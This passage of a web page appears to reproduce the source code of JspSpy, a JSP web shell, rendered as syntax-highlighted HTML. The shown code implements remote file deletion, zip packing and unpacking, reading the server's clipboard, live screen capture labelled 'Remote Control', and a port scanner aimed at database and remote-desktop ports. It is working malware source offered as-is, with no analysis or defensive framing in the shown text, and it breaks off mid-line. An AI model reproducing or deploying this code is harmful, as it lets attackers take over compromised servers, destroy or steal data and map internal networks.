doPost(&#123;o:'filelist',folder:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		parent:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var parent=(this.path.substr(0,this.path.lastIndexOf(\"</span>/\<span class="string">")))+'/';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'filelist',folder:parent&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		createFile:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('Input New File Name','');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vCreateFile',filepath:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		deleteBatch:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (!confirm('Are You Sure To Delete These Files?')) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var selected = new Array();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var inputs = document.getElementsByTagName('input');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			for (var i = 0;i&lt;inputs.length;i++)&#123;if(inputs[i].checked)&#123;selected.push(inputs[i].value)&#125;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (selected.length == 0) &#123;alert('No File Selected');return;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'deleteBatch',files:selected.join(',')&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		packBatch:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var selected = new Array();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var inputs = document.getElementsByTagName('input');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			for (var i = 0;i&lt;inputs.length;i++)&#123;if(inputs[i].checked)&#123;selected.push(inputs[i].value)&#125;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (selected.length == 0) &#123;alert('No File Selected');return;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (savefilename == null || savefilename.trim().length == 0)return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'packBatch',files:selected.join(','),savefilename:savefilename&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		pack:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var tmpName = '';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (this.filename.indexOf('.') == -1) tmpName = this.filename;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			else tmpName = this.filename.substr(0,this.filename.lastIndexOf('.'));"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			tmpName += '.zip';"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = this.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var name = prompt('Input Target File Name (Only Support Zip)',tmpName);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (name == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'pack',packedfile:path,savefilename:name&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		vEditProperty:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = this.path;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'vEditProperty',filepath:path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		unpack:function() &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var path = prompt('unpack to : ',this.currentDir+'/'+this.filename.substr(0,this.filename.lastIndexOf('.')));"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			if (path == null || path.trim().length == 0) return;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			doPost(&#123;o:'unpack',savepath:path,zipfile:this.path&#125;)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function doPost(obj) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var form = document.forms[\"</span>doForm\<span class="string">"];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var elements = form.elements;for (var i = form.length - 1;i&gt;=0;i--)&#123;form.removeChild(elements[i])&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		for (var pro in obj)"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var input = document.createElement(\"</span>input\<span class="string">");"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.type = \"</span>hidden\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.name = pro;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			input.value = obj[pro];"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			form.appendChild(input);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		form.submit();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/script&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BeforeInvoker extends  DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;JspSpy Codz By - Ninty&lt;/title&gt;&lt;style type=\"</span>text/css\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"body,td&#123;font: 12px Arial,Tahoma;line-height: 16px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".input&#123;font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".area&#123;font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".bt &#123;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a &#123;color: #00f;text-decoration:underline;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"a:hover&#123;color: #f00;text-decoration:none;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".alt1 td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".alt2 td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".focus td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".head td&#123;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".head td span&#123;font-weight:normal;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"form&#123;margin:0;padding:0;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"h2&#123;margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"ul.info li&#123;margin:0;color:#444;line-height:24px;height:24px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"u&#123;text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">".secho&#123;height:400px;width:100%;overflow:auto;border:none&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/style&gt;&lt;/head&gt;&lt;body style=\"</span>margin:<span class="number">0</span>;table-layout:fixed; word-break:break-all\<span class="string">"&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> AfterInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/body&gt;&lt;/html&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> DeleteBatchInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> files = <span class="built_in">request</span>.getParameter(<span class="string">"files"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(files)) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> currentDir = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] arr = files.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> fs:arr) &#123;</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(currentDir,fs);</span></span><br><span class="line"><span class="vbscript">f.delete();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Delete Files Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ClipBoardInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;h2&gt;System Clipboard &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;pre&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">try&#123;</span></span><br><span class="line"><span class="vbscript">out.println(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor))));</span></span><br><span class="line"><span class="vbscript">&#125;catch (Exception ex) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"ClipBoard is Empty Or Is Not Text Data !"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/pre&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input class=\"</span>bt\<span class="string">" name=\"</span>button\<span class="string">" id=\"</span>button\<span class="string">" onClick=\"</span>history.back()\<span class="string">" value=\"</span>Back\<span class="string">" type=\"</span>button\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VRemoteControlInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;script type=\"</span>text/javascript\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	var interval = null;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function a(btn) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		if (btn.value == \"</span><span class="keyword">Stop</span>\<span class="string">")"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			sstopClick(btn);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125; else &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			startClick(btn);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function startClick(btn)&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		btn.value = \"</span><span class="keyword">Stop</span>\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		var pl = document.getElementById(\"</span>pl\<span class="string">").value;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		interval = setInterval(function()&#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			var img = document.getElementById(\"</span>screen\<span class="string">");"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"			img.src = \""+SHELL_NAME+"</span>?o=gc&amp;<span class="built_in">rnd</span>=\<span class="string">"+Math.random();"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		&#125;,parseInt(pl)*1000);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	function sstopClick(btn) &#123;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		clearInterval(interval);"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"		btn.value = \"</span>Start\<span class="string">";"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&#125;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/script&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;h2&gt;Remote Control &amp;raquo;&lt;/h2&gt;&lt;input class=\"</span>bt\<span class="string">" onclick=\"</span>var img = document.getElementById(<span class="comment">'screen').src='"+SHELL_NAME+"?o=gc&amp;rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"Get Screen\" type=\"button\" size=\"100\"  /&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"          &lt;input class=\"</span>bt\<span class="string">" name=\"</span>button\<span class="string">" id=\"</span>button\<span class="string">" onClick=\"</span>a(this)\<span class="string">" value=\"</span>Start\<span class="string">" type=\"</span>button\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt; Speed(Second , dont be so fast)  &lt;input type='text' value='3' size='5' id='pl' name='pl'/&gt;  Can Not Control Yet."</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"        &lt;hr/&gt;&lt;p&gt;&lt;img id='screen' src='x'/&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"      &lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//GetScreen</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> GcInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Dimension size = Toolkit.getDefaultToolkit().getScreenSize();</span></span><br><span class="line"><span class="vbscript">Rectangle rec = <span class="keyword">new</span> Rectangle(<span class="number">0</span>,<span class="number">0</span>,(<span class="built_in">int</span>)size.getWidth(),(<span class="built_in">int</span>)size.getHeight());</span></span><br><span class="line"><span class="vbscript">BufferedImage img = <span class="keyword">new</span> Robot().createScreenCapture(rec);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.setContentType(<span class="string">"image/jpeg"</span>);</span></span><br><span class="line"><span class="vbscript">ImageIO.write(img,<span class="string">"jpg"</span>,<span class="built_in">response</span>.getOutputStream());</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VPortScanInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ports = <span class="built_in">request</span>.getParameter(<span class="string">"ports"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> timeout = <span class="built_in">request</span>.getParameter(<span class="string">"timeout"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip))</span></span><br><span class="line"><span class="vbscript">ip = <span class="string">"127.0.0.1"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ports))</span></span><br><span class="line"><span class="vbscript">ports = <span class="string">"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(timeout)) </span></span><br><span class="line"><span class="vbscript">timeout = <span class="string">"2"</span>;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2 id=\"</span>Bin_H2_Title\<span class="string">"&gt;PortScan &amp;gt;&amp;gt;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;div id=\"</span>YwLB\<span class="string">"&gt;&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input type=\"</span>hidden\<span class="string">" value=\"</span>portScan\<span class="string">" name=\"</span>o\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"IP : &lt;input name=\"</span>ip\<span class="string">" type=\"</span>text\<span class="string">" value=\""+ip+"</span>\<span class="string">" id=\"</span>ip\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">10</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; Port : &lt;input name=\"</span>ports\<span class="string">" type=\"</span>text\<span class="string">" value=\""+ports+"</span>\<span class="string">" id=\"</span>ports\<span class="string">" class=\"</span>input\<span class="string">" style=\"</span>width:<span class="number">40</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; Timeout （秒） : &lt;input name=\"</span>timeout\<span class="string">" type=\"</span>text\<span class="string">" value=\""+timeout+"</span>\<span class="string">" id=\"</span>timeout\<span class="string">" class=\"</span>input\<span class="string">" size=\"</span><span class="number">5</span>\<span class="string">" style=\"</span>margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">" /&gt; &lt;input type=\"</span>submit\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Scan\<span class="string">" id=\"</span>submit\<span class="string">" class=\"</span>bt\<span class="string">" /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;&lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> PortScanInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vPortScan"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ip = <span class="built_in">request</span>.getParameter(<span class="string">"ip"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> ports = <span class="built_in">request</span>.getParameter(<span class="string">"ports"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> timeout = <span class="built_in">request</span>.getParameter(<span class="string">"timeout"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> iTimeout = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(ip) || Util.<span class="built_in">isEmpty</span>(ports))</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.isInteger(timeout)) &#123;</span></span><br><span class="line"><span class="vbscript">timeout = <span class="string">"2"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">iTimeout = Integer.parseInt(timeout);</span></span><br><span class="line"><span class="vbscript">Map&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt; rs = <span class="keyword">new</span> LinkedHashMap&lt;<span class="built_in">String</span>,<span class="built_in">String</span>&gt;();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span>[] portArr = ports.<span class="built_in">split</span>(<span class="string">","</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">String</span> port:portArr) &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Socket s = <span class="keyword">new</span> Socket();</span></span><br><span class="line"><span class="vbscript">s.connect(<span class="keyword">new</span> InetSocketAddress(ip,Integer.parseInt(port)),iTimeout);</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">rs.put(port,<span class="string">"Open"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">rs.put(port,<span 